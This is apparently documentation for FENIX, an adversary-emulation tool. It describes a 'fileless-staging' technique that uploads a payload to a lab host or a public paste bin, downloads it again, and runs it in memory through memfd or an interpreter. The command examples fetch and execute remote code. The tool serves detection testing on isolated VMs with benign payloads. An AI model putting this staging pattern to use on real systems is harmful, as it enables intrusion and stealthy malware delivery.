# Remote fileless-staging

`fileless-staging` can fetch a payload over the network. **Upload is never the default.** FENIX does not pick uguu, catbox, tmpfiles, or any other public bin unless you name it.

| Mode | How | Upload? |
|------|-----|---------|
| Local file | `--source-file` | No |
| URL you already have | `--source-url` | No |
| GitHub-raw preset | `--lab-remote hello-b64` | No |
| Upload then download | `--remote` **and** a named backend or URL | Yes — you choose the host |

## Opt-in upload (`--remote`)

Use this when you want dropper-style telemetry: local file → HTTP PUT/POST → GET the same bytes → memfd or interpreter.

Before any network call, FENIX prints the plan (local path, backend, upload target, download method, execute path).

### Host you control (recommended)

HTTP **PUT** the bytes to a URL you own. After a successful PUT, FENIX GETs that URL (or a URL returned in the response body, or `--remote-download-url`).

```bash
# Example: python -m http.server does *not* accept PUT. Use a lab file host,
# MinIO, nginx WebDAV, or similar that you operate.

fenix run fileless-staging \
  --source-file payloads/hello_elf/hello \
  --remote \
  --remote-backend put \
  --remote-upload-url https://your-lab-host/fenix-hello.bin \
  --execute memfd \
  --method procfs-fd
```

HTTP **POST** multipart (`file=`) when your lab endpoint expects a form upload and replies with a download URL:

```bash
fenix run fileless-staging \
  --source-file payloads/hello_elf/hello \
  --remote \
  --remote-backend post \
  --remote-upload-url https://your-lab-host/upload
```

YAML (`examples/fileless_staging_remote.yaml` and `fileless_staging_remote_curl.yaml`):

**These two files will not run as checked in.** They contain `https://YOUR-LAB-HOST/...` on purpose. FENIX prints a refusal banner and exits until you replace that host, or switch `remote_backend` to a named adapter (`uguu` | `tmpfiles` | `catbox` | `pastebin`).

```yaml
technique: fileless-staging
source_file: payloads/hello_elf/hello
remote: true
remote_backend: put
remote_upload_url: https://YOUR-LAB-HOST/fenix-hello.bin   # edit this
execute: memfd
method: procfs-fd
```

### Named third-party adapters (explicit only)

These exist so a lab can reproduce “upload to a public bin” telemetry. FENIX will not select them automatically.

```bash
fenix run fileless-staging --source-file payloads/hello_elf/hello \
  --remote --remote-backend uguu --execute memfd --method procfs-fd

fenix run fileless-staging \
  --source-file payloads/scripts/hello.rb \
  --remote \
  --remote-backend uguu \
  --remote-fetch curl \
  --execute interpreter \
  --interpreter ruby \
  --mode stdin

fenix run fileless-staging --source-file payloads/hello_elf/hello \
  --remote --remote-backend tmpfiles --remote-fetch curl

export FENIX_PASTEBIN_API_KEY=your_dev_key
fenix run fileless-staging --source-file payloads/hello_elf/hello \
  --remote --remote-backend pastebin
```

`catbox` and `pastebin` are the other named adapters. Pastebin is text-only (ELF is base64-encoded when needed).

### Options

| Option | Values | Notes |
|--------|--------|-------|
| `--remote` | flag | Requires `--source-file` **and** a backend or upload URL |
| `--remote-backend` | `put`, `post`, `uguu`, `tmpfiles`, `catbox`, `pastebin` | No default |
| `--remote-upload-url` | URL | Required for `put` / `post` |
| `--remote-download-url` | URL | Optional GET URL after a successful upload |
| `--remote-fetch` | `requests`, `curl`, `wget`, `python` | How the **download** step runs |
| `--remote-encode` | `auto`, `none`, `base64` | `auto` base64-encodes ELF for Pastebin |

### Environment (same as CLI / YAML)

```bash
export FENIX_REMOTE_BACKEND=put
export FENIX_REMOTE_UPLOAD_URL=https://your-lab-host/fenix-hello.bin
export FENIX_REMOTE_DOWNLOAD_URL=   # optional
export FENIX_REMOTE_FETCH=curl
export FENIX_PASTEBIN_API_KEY=      # only for pastebin
```

`--remote` with no backend and no env vars fails with that list of options. Nothing is uploaded.

## Download only (`--source-url` / `--lab-remote`)

```bash
fenix run fileless-staging \
  --source-url "https://pastebin.com/raw/XXXXXXXX" \
  --decode base64 --execute memfd --method procfs-fd

fenix staging-presets
fenix run fileless-staging --lab-remote hello-b64
```

`--lab-remote` uses GitHub raw (`FENIX_LAB_STAGING_BASE`, default `https://raw.githubusercontent.com/elastic/fenix/main`). No upload.

## Coverage testing

`fenix run-all` and `--full` do **not** upload. Add `--with-remote` only after setting `FENIX_REMOTE_BACKEND` or `FENIX_REMOTE_UPLOAD_URL`; otherwise that case is skipped.

## Lab-only

- Prefer a host you operate. Named public bins are third-party — do not upload secrets.
- Use isolated VMs and benign `hello_elf` / `hello.py` payloads.
